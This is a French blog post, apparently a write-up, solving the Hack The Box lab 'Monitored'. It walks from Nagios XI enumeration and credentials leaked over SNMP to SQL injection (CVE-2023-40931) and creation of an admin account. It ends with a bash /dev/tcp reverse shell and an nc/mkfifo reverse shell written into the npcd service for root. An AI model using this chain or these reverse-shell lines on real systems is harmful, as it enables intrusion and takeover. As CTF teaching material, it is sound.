<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Monitored</title>
<meta name=description content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored met l&amp;rsquo;accent sur une énumération rigoureuse, le challenge commence avec un …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-monitored/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Monitored"><meta property="og:description" content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored met l&amp;rsquo;accent sur une énumération rigoureuse, le challenge commence avec un …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Monitored"><meta name=twitter:description content="Platforme: Hack The Box Lien: Monitored Niveau: Moyen OS: Linux Monitored met l&amp;rsquo;accent sur une énumération rigoureuse, le challenge commence avec un …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-monitored/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-monitored/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Monitored/Monitored.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-monitored/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-monitored/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Monitored</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>9 Mai 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Monitored>Monitored</a></li><li>Niveau: Moyen</li><li>OS: Linux</li></ul><hr><p>Monitored met l&rsquo;accent sur une énumération rigoureuse, le challenge commence avec un formulaire de connexion pour Nagios XI et l&rsquo;énumération des répertoires mène à la découverte de plus en plus de points de terminaison. Après avoir exploité toutes les pistes de notre scan TCP, nous utilisons un scan UDP pour trouver un service exploitable qui conduit à une fuite d&rsquo;identifiants que nous utilisons pour nous connecter. Nous découvrons la version du logiciel sur la cible et utilisons le <code>CVE-2023-40931</code> pour ajouter un nouveau compte administrateur à l&rsquo;instance de Nagios XI afin de nous accorder l&rsquo;accès. En exécutant une commande (reverse shell) dans Nagios XI, un accès initial est établi et en manipulant certains services, nous escaladons nos privilèges pour pour accéder au compte root.</p><p>Adresse IP cible - <code>10.10.11.248</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Monitored 10.10.11.248
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-17 11:55 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.248
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.051s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>996</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE  VERSION
</span></span><span style=display:flex><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp  open  http     Apache httpd 2.4.56
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.56 <span style=color:#56b6c2>(</span>Debian<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to https://nagios.monitored.htb/
</span></span><span style=display:flex><span>389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
</span></span><span style=display:flex><span>443/tcp open  ssl/http Apache httpd 2.4.56 <span style=color:#56b6c2>((</span>Debian<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.56 <span style=color:#56b6c2>(</span>Debian<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| tls-alpn: 
</span></span><span style=display:flex><span>|_  http/1.1
</span></span><span style=display:flex><span>|_http-title: Nagios XI
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>nagios.monitored.htb/organizationName<span style=color:#56b6c2>=</span>Monitored/stateOrProvinceName<span style=color:#56b6c2>=</span>Dorset/countryName<span style=color:#56b6c2>=</span>UK
</span></span><span style=display:flex><span>| Not valid before: 2023-11-11T21:46:55
</span></span><span style=display:flex><span>|_Not valid after:  2297-08-25T21:46:55
</span></span><span style=display:flex><span>Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 19.69 seconds
</span></span></code></pre></div><p>Quatre ports ouverts sont détectés, 22 (SSH), 80 (HTTP avec Apache), 389 (LDAP), 443 (HTTPS). Nous sommes également redirigés vers <code>nagios.monitored.htb/</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.248 monitored.htb nagios.monitored.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Nous trouvons une page de login Nagios XI après avoir cliqué sur <code>Access Nagios XI</code> lorsque nous visitons <code>https://nagios.monitored.htb/</code></p><p><img src=/images/HTB-Monitored/Nagios-XI.png alt="Nagios XI"></p><p>L&rsquo;url de cette page est <code>https://nagios.monitored.htb/nagiosxi/login.php</code>. Nous n&rsquo;avons pas les identifiants pour nous connecter pour le moment.</p><p><img src=/images/HTB-Monitored/Nagios-XI-login.png alt=Nagios-login-XI></p><blockquote><p>Nagios est un <strong>outil open source de surveillance des systèmes informatiques</strong>. Il a été conçu pour fonctionner sur le système d&rsquo;exploitation Linux et peut surveiller des appareils fonctionnant sous Linux, Windows et Unix.</p></blockquote><p>Nous pouvons faire une énumération de répertoires avec ffuf. Commençons par <code>https://nagios.monitored.htb/</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/FUZZ -ic
</code></pre><p><img src=/images/HTB-Monitored/fuzz.png alt="Subdomain fuzzing"></p><p>Nous trouvons un point de terminaison <code>/nagios</code> et la visite de <code>https://nagios.monitored.htb/nagios</code> nous invite à nous connecter, mais nous n&rsquo;avons pas d&rsquo;informations d&rsquo;identification à ce stade.</p><p><img src=/images/HTB-Monitored/nagios-login.png alt="Second Nagios Login form"></p><p>Ensuite, nous examinons <code>https://nagios.monitored.htb/nagiosxi/</code> et plusieurs résultats sont obtenus.</p><pre tabindex=0><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/FUZZ&#39; -e .php,.html,.txt -ic -fc 404 -c
</code></pre><p><img src=/images/HTB-Monitored/ffuf.png alt="Ffuf directory enumeration"></p><ul><li><p>La plupart de ces points de terminaison redirigent vers la page de connexion, probablement parce que nous devons être authentifiés pour y accéder.</p></li><li><p><code>/images</code> et <code>/api</code> renvoient <code>Forbidden</code>.</p></li></ul><p><img src=/images/HTB-Monitored/forbidden.png alt="Forbidden page"></p><ul><li><code>/terminal</code> présente une page intitulée <code>Shell In A Box</code> où nous avons accès à un terminal dans le navigateur pour nous connecter.</li></ul><p><img src=/images/HTB-Monitored/terminal.png alt="Nagios XI terminal endpoint"></p><p>En allant plus en profondeur, <code>/images</code> révèle davantage de résultats, mais nous n&rsquo;avons pas les permissions pour y accéder.</p><pre tabindex=0><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#39;https://nagios.monitored.htb/nagiosxi/images/FUZZ&#39; -ic -c
</code></pre><p><img src=/images/HTB-Monitored/images-fuzz.png alt="Images endpoint enumeration"></p><p><img src=/images/HTB-Monitored/renewals.png alt="Images endpoint enumeration - Renewal"></p><p>En faisant la même chose pour <code>/api</code>, nous trouvons <code>/includes</code> et <code>/v1</code>.</p><pre tabindex=0><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u &#39;https://nagios.monitored.htb/nagiosxi/api/FUZZ&#39; -ic -c
</code></pre><p><img src=/images/HTB-Monitored/api.png alt="api endpoint enumeration"></p><p><code>includes</code> ne donne rien d&rsquo;utile mais <code>v1</code> renvoie quelques résultats intéressants.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -fc 404 -u &#39;https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ&#39; -ic -fs 32 -fc 403
</code></pre><p><img src=/images/HTB-Monitored/v1-fuzz.png alt="api endpoint enumeration - v1"></p><p><code>license</code> et <code>autheticate</code> renvoient tous deux des erreurs.</p><p><img src=/images/HTB-Monitored/license.png alt="api endpoint enumeration - v1 - license"></p><p><img src=/images/HTB-Monitored/authenticate.png alt="api endpoint enumeration - v1 - authenticate"></p><p>À ce stade, nous avons énuméré tous les éléments découverts. Pour le moment, nous avons trouvé:</p><ul><li><p>Trois pages de connexion:</p><ul><li><a href=https://nagios.monitored.htb/nagiosxi/>https://nagios.monitored.htb/nagiosxi/</a></li><li><a href=https://nagios.monitored.htb/nagiosxi/terminal>https://nagios.monitored.htb/nagiosxi/terminal</a></li><li><a href=https://nagios.monitored.htb/nagios>https://nagios.monitored.htb/nagios</a></li></ul></li><li><p>Un point de terminaison d&rsquo;authentification à l&rsquo;adresse <a href=https://nagios.monitored.htb/nagiosxi/api/v1/authenticate>https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</a></p></li></ul><p>Il apparaît clairement que nous avons besoin d&rsquo;informations d&rsquo;identification pour accéder au système cible.</p><blockquote><p>Bien que les scans UDP soient rarement nécessaires dans les CTF, nous nous devons d&rsquo;être aussi minutieux que possible dans notre reconnaissance. Je suis resté bloqué pendant longtemps après avoir omis d&rsquo;utiliser un scan UDP.</p></blockquote><p>Lançons un scan UDP.</p><pre tabindex=0><code>sudo nmap -sU -sC -sV -vv 10.10.11.248
</code></pre><blockquote><p>Il est normal pour les scans UDP de prendre beaucoup de temps, ils sont généralement plus lents.</p></blockquote><p><img src=/images/HTB-Monitored/udp-scan.png alt="nmap UDP scan"></p><p>Quatre ports seront découverts:</p><ul><li>68 - DHCP</li><li>123 - NTP</li><li>161 - SNMPv1</li><li>162 - SNMPv3</li></ul><p>Essayons d&rsquo;exploiter SNMP. Nous pouvons utiliser <code>snmpwalk</code> pour énumérer le service. Notons que deux versions de SNMP sont utilisées ici, nous spécifierons <code>SNMP V1</code> car elle est moins sécurisée.</p><blockquote><p>La commande ci-dessous génère beaucoup de données sur le terminal, il est donc préférable de l&rsquo;envoyer dans un fichier.</p></blockquote><pre tabindex=0><code>snmpwalk -c public -v1 -t 10 10.10.11.248 &gt; snmp.txt
</code></pre><p>En examinant le contenu du fichier, nous trouvons quelques lignes faisant référence à un script <code>/opt/scripts/check_host.sh</code> avec ce qui semble être des informations d&rsquo;identification <code>svc:XjH7VCehowpR1xZB</code>.</p><p><img src=/images/HTB-Monitored/creds-snmp.png alt="SNMP potential credentials"></p><p>Les identifiants ne fonctionnent pas sur <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> et nous constatons que ce compte utilisateur est soit désactivé, soit inexistant sur <code>https://nagios.monitored.htb/nagiosxi/login.php</code>.</p><p><img src=/images/HTB-Monitored/nagiosxi-login-attempt.png alt="NagiosXI login attempt failed"></p><h2 id=accès-initial>Accès Initial</h2><p>Sur <code>https://nagios.monitored.htb/nagios</code>, nous pouvons nous connecter. La page affiche un PID et la version du logiciel. Essayer de réutiliser le cookie de cette page sur <code>/nagiosxi</code> échoue également.</p><p><img src=/images/HTB-Monitored/nagios-core.png alt="NagiosXI login attempt successful"></p><p>En recherchant les vulnérabilités pour cette version spécifique du logiciel, nous trouvons <a href=https://outpost24.com/blog/nagios-xi-vulnerabilities/>trois CVE</a>. Ces vulnérabilités permettent à des utilisateurs disposant de différents niveaux de privilèges d&rsquo;accéder à des champs de la base de données par le biais d&rsquo;injections SQL.</p><p><img src=/images/HTB-Monitored/nagios-vulns.png alt="NagiosXI vulnerabilities"></p><p><img src=/images/HTB-Monitored/CVE-2023-40931-EXPLAINED.png alt=CVE-2023-40931-EXPLAINED></p><p>Rappelons que sur <code>/api/v1/authenticate</code> nous avons vu le message <code>Vous ne pouvez utiliser POST qu'avec authenticate.</code></p><ol><li>Nous envoyons une requête POST à ce point de terminaison avec les informations d&rsquo;identification de l&rsquo;utilisateur et nous recevons un token</li></ol><pre tabindex=0><code>curl -k -L -X POST &#34;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#34; -d &#34;username=svc&amp;password=XjH7VCehowpR1xZB&#34;
</code></pre><p><img src=/images/HTB-Monitored/token-retrieval.png alt="Token retrieval"></p><ol start=2><li>Nous utilisons ce token pour lancer une injection SQL</li></ol><pre tabindex=0><code>sqlmap -u &#34;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=895ab920b8c2b4196e16ee5c4f6c4470fbd77bae&#34; -p id --level 5 --risk 3 --dump 
</code></pre><p>Lorsque le message <code>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</code> apparaît entrez <code>N</code>.</p><p><img src=/images/HTB-Monitored/sqlmap.png alt="SQLmap command"></p><p>SQLmap commencera à extraire toutes les tables de la base de données mais nous pouvons inspecter les tables qui nous intéressent en allant dans <code>/home/&lt;Votre_nom_d'utilisateur>/.local/share/sqlmap/output/nagios.monitored.htb/dump/</code>. Nous savons que la vulnérabilité est liée aux tables <code>xi_session</code> et <code>xi_users</code>.</p><p><img src=/images/HTB-Monitored/tables-dumped.png alt="SQLmap tables dump"></p><p>Vous pouvez aussi défiler sur le terminal et trouver le dump de la table <code>xi_users</code>. Nous trouvons la clé API pour l&rsquo;utilisateur <code>Nagios Administrator</code> <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code>.</p><p><img src=/images/HTB-Monitored/API-key.png alt="API key found"></p><blockquote><p>Des hashs de mots de passe sont également présents dans le dump mais nous ne sommes pas en mesure de les craquer.</p></blockquote><p>Nous n&rsquo;avons toujours pas d&rsquo;identifiants valides pour nous connecter à Nagios XI et il n&rsquo;y a aucun moyen de s&rsquo;inscrire. Notre seule option est de trouver comment ajouter un nouveau compte.</p><p>Après quelques recherches, nous trouvons comment ajouter de nouveaux utilisateurs via l&rsquo;API <a href="https://support.nagios.com/forum/viewtopic.php?t=42923">ici</a> et sur cette <a href="https://support.nagios.com/forum/viewtopic.php?f=6&amp;t=40502">page</a> nous apprenons également comment ajouter un compte administrateur en utilisant le paramètre <code>auth_level</code>.</p><p><img src=/images/HTB-Monitored/nagiosxi-api.png alt="NagiosXI add users via API"></p><p>La commande ci-dessous est utilisée pour créer un nouvel utilisateur admin. Les champs <code>username</code>, <code>email</code>, <code>name</code>, et <code>password</code> sont obligatoires.</p><pre tabindex=0><code>curl -k &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&#34; -d &#34;username=adminsec&amp;password=password123&amp;name=kscorpio&amp;email=kscorpio@monitored.htb&amp;auth_level=admin&#34;
</code></pre><p><img src=/images/HTB-Monitored/user-created.png alt="User added via API successfully"></p><p>Avec le compte nouvellement créé, nous pouvons nous connecter à Nagios XI à l&rsquo;adresse <code>https://nagios.monitored.htb/nagiosxi/</code>.</p><blockquote><p>Il vous sera demandé de changer le mot de passe après votre connexion.</p></blockquote><p><img src=/images/HTB-Monitored/nagiosxi-login.png alt="NagiosXI login success"></p><p>Sur le tableau de bord, survolez le menu <code>Configure</code> et sélectionnez <code>Core Config Manager</code>.</p><p><img src=/images/HTB-Monitored/nagiosxi-config.png alt="NagiosXI config"></p><p>Sélectionnez <code>Commandes</code> et ensuite <code>Add New</code>.</p><p><img src=/images/HTB-Monitored/config-cmd.png alt="Core Config Manager"></p><p><img src=/images/HTB-Monitored/new-cmd.png alt="Add new command"></p><p>Ajoutez une commande reverse shell et sauvegardez-la. Par exemple: <code>bash -c 'bash -i >& /dev/tcp/&lt;IP_Address>/&lt;Port> 0>&amp;1'</code>.</p><p><img src=/images/HTB-Monitored/rev-shell-cmd.png alt="Reverse shell command"></p><p>Vous devez également cliquer sur <code>Apply Configuration</code> pour que la nouvelle commande soit listée. Vous devriez maintenant voir <code>149 Commands</code>.</p><p><img src=/images/HTB-Monitored/apply-config.png alt="Apply configuration"></p><p>Démarrons un listener sur le port spécifié dans notre commande.</p><p>Pour lancer la commande, allez dans <code>Monitoring</code> > <code>Hosts</code> > cliquez sur <code>localhost</code>.</p><p><img src=/images/HTB-Monitored/localhost.png alt="Configuration - localhost"></p><p>Sous <code>Check command</code>, sélectionnez votre commande et cliquez sur <code>Run Check Command</code> et vous obtiendrez une connexion sur votre listener.</p><p><img src=/images/HTB-Monitored/nagios-shell.png alt="Initial Foothold"></p><p>Le premier flag est accessible à <code>/home/nagios/user.txt</code>.</p><p><img src=/images/HTB-Monitored/user-flag.png alt="User flag"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>En exécutant <code>sudo -l</code> nous découvrons que l&rsquo;utilisateur peut manipuler deux services <code>nagios</code> et <code>npcd</code> en plus de pouvoir exécuter divers scripts.</p><p><img src=/images/HTB-Monitored/sudo-l.png alt="sudo -l command"></p><p>En utilisant la commande <code>find</code>, nous obtenons les emplacements exacts de <code>nagios</code> et de <code>npcd</code>.</p><pre tabindex=0><code>find / -name nagios 2&gt; /dev/null

find / -name npcd 2&gt; /dev/null
</code></pre><p><img src=/images/HTB-Monitored/services-location.png alt="services locations"></p><p>Nous vérifions également les permissions des binaires et nous notons que nous avons les permissions d&rsquo;écriture pour <code>npcd</code>. Nous pouvons éditer le contenu du fichier et le remplacer par une commande malveillante pour obtenir un shell.</p><p><img src=/images/HTB-Monitored/binaries-perms.png alt="Binaries permissions"></p><ol><li>Stopper le service</li></ol><pre tabindex=0><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
</code></pre><ol start=2><li>Editer <code>npcd</code></li></ol><pre tabindex=0><code>echo &#39;#!/bin/bash&#39; &gt; /usr/local/nagios/bin/npcd

echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.4 5555 &gt;/tmp/f&#39; &gt;&gt; /usr/local/nagios/bin/npcd
</code></pre><ol start=3><li>Démarrez un listener et démarrez le service <code>npcd</code> à l&rsquo;aide du script</li></ol><pre tabindex=0><code>sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
</code></pre><p>Nous obtenons un shell root sur notre listener et nous pouvons lire le drapeau root dans <code>/root/root.txt</code>.</p><p><img src=/images/HTB-Monitored/root-flag.png alt="Root flag"></p><p>J&rsquo;espère que cet article vous a été utile! Si vous avez des questions, vous pouvez me contacter sur Twitter à <a href=https://twitter.com/_KScorpio>_KScorpio</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-surveillance/>&#8592;
Précédent:
HTB: Surveillance</a></p><p class=prev-post-date>avril 19, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-bizness/>Suivant:
HTB: Bizness
&#8594;</a></p><p class=next-post-date>mai 22, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>